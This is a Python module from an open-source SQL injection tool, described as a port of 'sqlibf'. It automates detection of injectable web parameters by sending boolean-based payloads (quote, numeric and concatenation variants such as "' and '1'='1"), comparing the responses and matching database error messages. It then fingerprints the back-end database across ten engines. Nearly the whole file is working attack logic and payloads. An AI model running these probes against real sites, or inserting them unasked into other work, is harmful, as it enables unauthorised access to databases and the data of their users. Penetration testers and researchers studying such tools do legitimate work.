#Covered by GPL V2.0
#Coded by Carlos del Ojo Elias (deepbit@gmail.com)
# This is a port of sqlibf to python, # sqlibf is a SQL injection 
# tool that was coded by Ramon Pinuaga (www.open-labs.org)

from injection import *
from misc import *
from sqResult import *
from database import *
import urllib
import logging
import sys
import copy



class Test:
	def __init__(self):
		pass

class InjectTry:
	def __init__(self,type):
		self.type=type
		self.tryTests=[]

	def addTry (self,pattern,tryCompareEqual):
		self.tryTests.append((urllib.quote(pattern),tryCompareEqual))
	
	def MakeTry(self,sqRObj):

		var=sqRObj.getVar()
		req=sqRObj.getReq()
		method=sqRObj.getMethod()

		testFailed=False

		for payload,result in self.tryTests:
			var.append(payload)

			logging.debug("Trying injection in - %s - %s - %s" % (method,var.name,urllib.unquote(payload)))

			req.perform()
			req.response.Substitute(payload," ")

			for i in FingerTests:       ### Este bucle es para buscar errores de SQL en los resultados
				if i.searchError(req.response):
					logging.debug("Error Message FOUND - %s" % (i.getName()))
					sqRObj.setError(i.getName())

			tmpreq=copy.deepcopy(req)

			var.restore()
					
			if sqRObj.equalResponse(req.response)!=result:
				testFailed=True
				logging.debug("FAILED")
				break
			logging.debug("DONE")



		if not testFailed:
			logging.debug("Parameter INJECTABLE - %s - %s - %s" % (str(self.type),method,var.name))
			sqRObj.setType(self.type)


		if not testFailed or sqRObj.getError():
			return True,tmpreq

		return False,None

		

class InjectionTest(Test):
	def __init__(self,tests):
		self.tests=tests

	def launch(self,sqRObj):
		result=False
		for i in self.tests:
			result,req=i.MakeTry(sqRObj)
			if result:
				return True,req
		return False,None
		

		

class FingerprintTest:
	def __init__(self,tests):
		self.tests=tests

	def launch(self,sqRObj):
		res=False
		for i in self.tests:
			logging.debug("Trying %s" % (str(i)))
			res=self.TryDB(i,sqRObj)
			if res:
				return True,None
		return False,None

	def TryDB(self,db,sqRObj):

		try:
			payload1=db.getTestPattern(sqRObj.getType())
			payload2=db.getConfirmPattern(sqRObj.getType())
		except:
			return False

		var=sqRObj.getVar()
		method=sqRObj.getMethod()
		req=sqRObj.getReq()

		logging.debug("Variable - %s - %s" % (method,var.name))
		logging.debug("Payloads to try: %s - %s" % (urllib.unquote(payload1),urllib.unquote(payload2)))

	
		var.append(payload1)		

		req.perform()
		req.response.Substitute(payload1," ")


		testPassed=False

		if sqRObj.equalResponse(req.response):
			logging.debug("Payloads one DONE" )
			var.restore()
			var.append(payload2)
	
			req.perform()
			req.response.Substitute(payload2," ")

			if sqRObj.equalResponse(req.response):
				logging.debug("Payload two DONE - Fingerprint on variable - %s - %s - %s" % (method,var.name,db.getName()))
				testPassed=True
			else:
				logging.debug("Payload two FAILED!!!! - Not fingerprint on variable - %s - %s - %s" % (method,var,db.getName()))

		var.restore()

		if testPassed:
			sqRObj.setDB(db.getName())
			return True

		return False



FingerTests=[]
FingerTests.append(MysqlDB)
FingerTests.append(MSSQLDB)
FingerTests.append(OracleDB)
FingerTests.append(DB2DB)
FingerTests.append(PostgreSQLDB)
FingerTests.append(InformixDB)
FingerTests.append(SybaseDB)
FingerTests.append(MSAccessDB)
FingerTests.append(PointbaseDB)
FingerTests.append(SQLiteDB)


InjTests=[]
tmp=InjectTry(TUnescaped)
tmp.addTry(" and 1=1",True)
tmp.addTry(" and 1=2",False)
tmp.addTry(" and NoVale",False)
InjTests.append(tmp)

tmp=InjectTry(TSingleQuote)
tmp.addTry("' and '1'='1",True)
tmp.addTry("' and '1'='2",False)
tmp.addTry("' and NoVale",False)
InjTests.append(tmp)

tmp=InjectTry(TDoubleQuote)
tmp.addTry("\" and \"1\"=\"1",True)
tmp.addTry("\" and \"1\"=\"2",False)
tmp.addTry("\" and NoVale",False)
InjTests.append(tmp)

tmp=InjectTry(TNumeric)
tmp.addTry("-21+21",True)
tmp.addTry("-21",False)
tmp.addTry("-NoVale",False)
InjTests.append(tmp)

tmp=InjectTry(TConcatPipe)
tmp.addTry("'||lower('')||'",True)
tmp.addTry("'||'21",False)
tmp.addTry("'||Novale",False)
InjTests.append(tmp)

tmp=InjectTry(TConcatPlus)
tmp.addTry("'+lower('')+'",True)
tmp.addTry("'+'21",False)
tmp.addTry("'+Novale",False)
InjTests.append(tmp)


INJECTIONTESTS=InjectionTest(InjTests)
FINGERTESTS=FingerprintTest(FingerTests)
